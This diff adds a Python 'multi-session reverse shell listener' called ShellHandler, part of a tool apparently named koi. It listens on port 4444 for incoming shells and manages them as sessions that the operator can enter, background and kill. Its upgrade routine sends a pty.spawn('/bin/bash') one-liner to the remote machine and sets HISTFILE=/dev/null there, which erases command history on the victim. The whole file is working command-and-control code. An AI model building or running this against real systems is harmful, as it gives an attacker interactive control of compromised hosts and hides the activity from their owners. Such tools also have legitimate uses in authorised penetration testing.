@@ -1,0 +1,498 @@
+#!/usr/bin/env python3
+
+from __future__ import annotations
+
+import argparse
+import os
+import select
+import shutil
+import signal
+import socket
+import sys
+import termios
+import threading
+import time
+import tty
+from dataclasses import dataclass, field
+from datetime import datetime
+from typing import Dict, Optional
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+from koi.ui import (
+    gradient_text, colored_text, display_art, print_report_box, print_status_line, breaker, notify,
+    PUMPKIN, WHITE, SILVER, CORAL, UMBER,
+    _b, _d, _r, _g, _c, _p, _y, _o, _gr
+)
+
+LOCALUSER = os.getenv("USER") or os.getenv("USERNAME") or "user"
+
+@dataclass
+class Session:
+    id: int
+    conn: socket.socket
+    addr: tuple
+    connected_at: datetime = field(default_factory=datetime.now)
+    alive: bool = True
+    upgraded: bool = False
+    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False)
+
+    def _uptime(self) -> str:
+        secs = int((datetime.now() - self.connected_at).total_seconds())
+        m, s = divmod(secs, 60)
+        h, m = divmod(m, 60)
+        return f"{h:02d}:{m:02d}:{s:02d}"
+
+    def status_dot(self) -> str:
+        if not self.alive:
+            return _gr("○")
+        return _p("◆") if self.upgraded else _r("●")
+        
+    def send(self, data: bytes) -> bool:
+        try:
+            with self._lock:
+                self.conn.sendall(data)
+            return True
+        except OSError:
+            self.alive = False
+            return False
+
+    def close(self) -> None:
+        self.alive = False
+        for fn in (lambda: self.conn.shutdown(socket.SHUT_RDWR), self.conn.close):
+            try:
+                fn()
+            except OSError:
+                pass
+
+class RawTerminal:
+    def __init__(self):
+        self._old = None
+        self._fd  = sys.stdin.fileno()
+
+    def __enter__(self):
+        self._old = termios.tcgetattr(self._fd)
+        tty.setraw(self._fd)
+        return self
+
+    def __exit__(self, *_):
+        if self._old:
+            termios.tcsetattr(self._fd, termios.TCSADRAIN, self._old)
+
+def print_help():
+    data = {
+        f"{_g('ls')}": "List all active sessions",
+        f"{_g('go')} {_p('<id>')}": "Enter a session interactively",
+        f"{_g('upgrade')} {_p('<id>')}": "Upgrade session to a full PTY",
+        f"{_g('kill')} {_p('<id>')}": "Terminate and remove a session",
+        f"{_g('help')}": "Show this message",
+        f"{_g('exit')}": "Shut down the listener",
+    }
+    print_report_box("Commands", data)
+    data = {
+        f"{_y('Ctrl+Z')}": "Background → return to listener shell",
+        f"{_y('Ctrl+C')}": "Send SIGINT to remote (keeps session alive)",
+    }
+    print_report_box("Session Signals", data)
+
+
+class Listener:
+    CTRL_Z = b"\x1a"
+    CTRL_C = b"\x03"
+
+    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
+        self.host = host
+        self.port = port
+        self._sessions: Dict[int, Session] = {}
+        self._next_id = 1
+        self._id_lock = threading.Lock()
+        self._running = False
+        self._server_sock: Optional[socket.socket] = None
+        self._notify_r, self._notify_w = os.pipe()
+
+    def _add(self, conn, addr) -> Session:
+        with self._id_lock:
+            sid = self._next_id
+            self._next_id += 1
+        sess = Session(id=sid, conn=conn, addr=addr)
+        self._sessions[sid] = sess
+        return sess
+
+    def _get(self, sid: int) -> Optional[Session]:
+        return self._sessions.get(sid)
+
+    def _remove(self, sid: int) -> None:
+        sess = self._sessions.pop(sid, None)
+        if sess:
+            sess.close()
+
+    def _prune(self) -> None:
+        for sid in [k for k, s in self._sessions.items() if not s.alive]:
+            self._sessions.pop(sid)
+
+    def _accept_loop(self):
+        while self._running:
+            try:
+                self._server_sock.settimeout(1.0)
+                conn, addr = self._server_sock.accept()
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+
+            sess = self._add(conn, addr)
+            os.write(self._notify_w, b"1\n")
+            sys.stdout.write(f"\r\033[K")
+            notify('new', f"{_b(_c(f'#{sess.id}'))}  {_c(addr[0])}{_gr(f':{addr[1]}')}")
+            sys.stdout.write(self._prompt())
+            sys.stdout.flush()
+
+    def start(self):
+        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self._server_sock.bind((self.host, self.port))
+        self._server_sock.listen(16)
+        self._running = True
+
+        threading.Thread(target=self._accept_loop, daemon=True, name="accept").start()
+
+        display_art()
+        print()
+        notify('info', f"Listening on {_b(self.host)}:{_b(self.port)}")
+        print()
+        
+        self._main_loop()
+
+    def stop(self):
+        self._running = False
+        if self._server_sock:
+            try:
+                self._server_sock.close()
+            except OSError:
+                pass
+        for s in list(self._sessions.values()):
+            if s.upgraded:
+                s.send(b"exit\n")
+                time.sleep(0.5)
+            s.close()
+        print("\n" + gradient_text("  Shutting down. Goodbye.\n", PUMPKIN, UMBER))
+
+    def _prompt(self) -> str:
+        alive = sum(1 for s in self._sessions.values() if s.alive)
+        noun  = "session" if alive == 1 else "sessions"
+        count = colored_text(str(alive), PUMPKIN if alive else SILVER)
+        return (
+            f"{LOCALUSER}"
+            + colored_text("@", PUMPKIN)
+            + colored_text("koi", WHITE)
+            + _gr("(")
+            + count
+            + _gr(f" {noun})")
+            + gradient_text(" ❯ ", PUMPKIN, CORAL)
+        )
+
+    def _main_loop(self):
+        while self._running:
+            try:
+                r, _, _ = select.select([self._notify_r], [], [], 0)
+                if r:
+                    os.read(self._notify_r, 4096)
+                raw = input(self._prompt()).strip()
+            except EOFError:
+                break
+            except KeyboardInterrupt:
+                print()
+                continue
+
+            if not raw:
+                continue
+
+            parts = raw.split()
+            cmd   = parts[0].lower()
+
+            if cmd in ("exit", "quit"):
+                self.stop()
+                return
+
+            elif cmd in ("help", "h", "?"):
+                print_help()
+
+            elif cmd in ("ls", "l", "list"):
+                self._cmd_ls()
+
+            elif cmd in ("go", "g", "interact"):
+                if len(parts) < 2:
+                    notify('error', f"Usage: go {_p('<id>')}")
+                else:
+                    try:
+                        self._cmd_go(int(parts[1]))
+                    except ValueError:
+                        notify('error', "Session id must be an integer.")
+
+            elif cmd in ("upgrade", "u"):
+                if len(parts) < 2:
+                    notify('error', f"Usage: upgrade {_p('<id>')}")
+                else:
+                    try:
+                        self._cmd_upgrade(int(parts[1]))
+                    except ValueError:
+                        notify('error', "Session id must be an integer.")
+
+            elif cmd == "kill":
+                if len(parts) < 2:
+                    notify('error', f"Usage: kill {_p('<id>')}")
+                else:
+                    try:
+                        self._cmd_kill(int(parts[1]))
+                    except ValueError:
+                        notify('error', "Session id must be an integer.")
+
+            else:
+                notify('error', f"Unknown command: {_p(cmd)}  — type {_b('help')}")
+
+    def _cmd_ls(self):
+        self._prune()
+        if not self._sessions:
+            print()
+            notify('status', _gr('No active sessions.'))
+            print()
+            return
+        data = {}
+        for s in sorted(self._sessions.values(), key=lambda x: x.id):
+            key = f"#{s.id}  {s.status_dot()}  {_c(s.addr[0])}{_gr(f':{s.addr[1]}')}"
+            data[key] = s._uptime()
+        print_report_box("Sessions", data)
+
+    def _cmd_go(self, sid: int):
+        self._prune()
+        sess = self._get(sid)
+        if sess is None:
+            notify('error', f"Session {_p(f'#{sid}')} not found.")
+            return
+        if not sess.alive:
+            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
+            self._remove(sid)
+            return
+
+        ip, port = sess.addr
+        print()
+        notify('info', f"Entering session {_b(_r(f'#{sid}'))} {_c(ip)}{_gr(f':{port}')}")
+        notify('status', _gr('Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote'))
+        print()
+
+        if sess.upgraded:
+            self._sync_winsize(sess)
+            self._drain(sess, 0.3)
+            sess.send(b"\n")
+            time.sleep(0.15)
+            signal.signal(signal.SIGWINCH, lambda *_: self._winch(sess))
+
+        breaker()
+
+        reason = self._interact(sess)
+
+        signal.signal(signal.SIGWINCH, signal.SIG_DFL)
+        print()
+        breaker()
+
+        if reason == "backgrounded":
+            print()
+            notify('warning', f"Session {_b(_c(f'#{sid}'))} backgrounded. Back at listener shell.")
+            print()
+        elif reason == "disconnected":
+            print()
+            notify('error', f"Session {_b(_c(f'#{sid}'))} disconnected.")
+            print()
+            self._remove(sid)
+
+    def _cmd_kill(self, sid: int):
+        sess = self._get(sid)
+        if sess is None:
+            notify('error', f"Session {_p(f'#{sid}')} not found.")
+            return
+        if sess.upgraded:
+            sess.send(b"exit\n")
+            time.sleep(0.5)
+        self._remove(sid)
+        notify('success', f"Session {_p(f'#{sid}')} terminated.")
+
+    def _drain(self, sess: Session, duration: float = 0.5) -> None:
+        """Read and discard incoming data for `duration` seconds."""
+        deadline = time.monotonic() + duration
+        while True:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                break
+            try:
+                r, _, _ = select.select([sess.conn], [], [], min(remaining, 0.05))
+                if r:
+                    sess.conn.recv(4096)
+            except OSError:
+                break
+
+    def _sync_winsize(self, sess: Session) -> None:
+        """Send stty rows/cols — caller must drain the echo afterwards."""
+        try:
+            cols, rows = shutil.get_terminal_size()
+        except Exception:
+            return
+        sess.send(f"stty rows {rows} cols {cols} 2>/dev/null\n".encode())
+
+    def _winch(self, sess: Session) -> None:
+        """SIGWINCH handler: sync size and silently drain echo."""
+        self._sync_winsize(sess)
+        self._drain(sess, 0.15)
+
+    def _cmd_upgrade(self, sid: int) -> None:
+        self._prune()
+        sess = self._get(sid)
+        if sess is None:
+            notify('error', f"Session {_p(f'#{sid}')} not found.")
+            return
+        if not sess.alive:
+            notify('error', f"Session {_p(f'#{sid}')} is no longer alive.")
+            self._remove(sid)
+            return
+        if sess.upgraded:
+            notify('warning', f"Session {_p(f'#{sid}')} is already upgraded.")
+            return
+
+        frames = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
+        stop_spin = threading.Event()
+
+        def _spin():
+            i = 0
+            while not stop_spin.is_set():
+                frame = colored_text(frames[i % len(frames)], PUMPKIN)
+                sys.stdout.write(f"\r  {frame}  {colored_text('Upgrading shell…', SILVER)}")
+                sys.stdout.flush()
+                time.sleep(0.08)
+                i += 1
+            sys.stdout.write("\r\033[K")
+            sys.stdout.flush()
+
+        spin_thread = threading.Thread(target=_spin, daemon=True)
+        spin_thread.start()
+
+        try:
+            spawn = (
+                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
+                "python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || "
+                "script -qc /bin/bash /dev/null\n"
+            )
+            sess.send(spawn.encode())
+            self._drain(sess, 0.8)
+
+            if not sess.alive:
+                stop_spin.set()
+                spin_thread.join()
+                notify('error', f"Session {_p(f'#{sid}')} died during upgrade.")
+                return
+
+            sess.send(b"export TERM=xterm-256color HISTFILE=/dev/null\n")
+            self._drain(sess, 0.3)
+
+            self._sync_winsize(sess)
+            self._drain(sess, 0.3)
+
+            sess.upgraded = True
+
+        finally:
+            stop_spin.set()
+            spin_thread.join()
+
+        notify('success', f"Shell {_p(f'#{sid}')} upgraded successfully.")
+
+    def _interact(self, sess: Session) -> str:
+        """
+        Full-duplex pass-through between local stdin/stdout and the remote socket.
+
+        Returns:
+            "backgrounded"  – Ctrl+Z pressed
+            "disconnected"  – remote closed the connection
+        """
+        stop_event = threading.Event()
+        result = ["backgrounded"]
+
+        def _recv():
+            while not stop_event.is_set() and sess.alive:
+                try:
+                    r, _, _ = select.select([sess.conn], [], [], 0.1)
+                    if not r:
+                        continue
+                    data = sess.conn.recv(4096)
+                    if not data:
+                        sess.alive = False
+                        result[0] = "disconnected"
+                        stop_event.set()
+                        return
+                    sys.stdout.buffer.write(data)
+                    sys.stdout.buffer.flush()
+                except OSError:
+                    sess.alive = False
+                    result[0] = "disconnected"
+                    stop_event.set()
+
+        recv_thread = threading.Thread(target=_recv, daemon=True)
+
+        with RawTerminal():
+            recv_thread.start()
+            try:
+                while not stop_event.is_set():
+                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
+                    if not r:
+                        continue
+                    key = os.read(sys.stdin.fileno(), 1024)
+
+                    if self.CTRL_Z in key:
+                        before = key[: key.index(self.CTRL_Z)]
+                        if before:
+                            sess.send(before)
+                        result[0] = "backgrounded"
+                        stop_event.set()
+                        break
+
+                    if not sess.send(key):
+                        result[0] = "disconnected"
+                        stop_event.set()
+                        break
+            except OSError:
+                pass
+
+        stop_event.set()
+        recv_thread.join(timeout=1.0)
+        return result[0]
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="ShellHandler – multi-session reverse shell listener",
+    )
+    parser.add_argument(
+        "--host", default="0.0.0.0",
+        help="Bind address (default: 0.0.0.0)"
+    )
+    parser.add_argument(
+        "--port", "-p", type=int, default=4444,
+        help="Listen port (default: 4444)"
+    )
+    args = parser.parse_args()
+
+    listener = Listener(host=args.host, port=args.port)
+
+    signal.signal(
+        signal.SIGINT,
+        lambda *_: (print(), notify('warning', f"Use {_b('exit')} to quit cleanly."))
+    )
+
+    try:
+        listener.start()
+    except PermissionError:
+        notify('error', f"Permission denied on port {args.port}.")
+        sys.exit(1)
+    except OSError as e:
+        notify('error', f"Cannot start listener: {e}")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
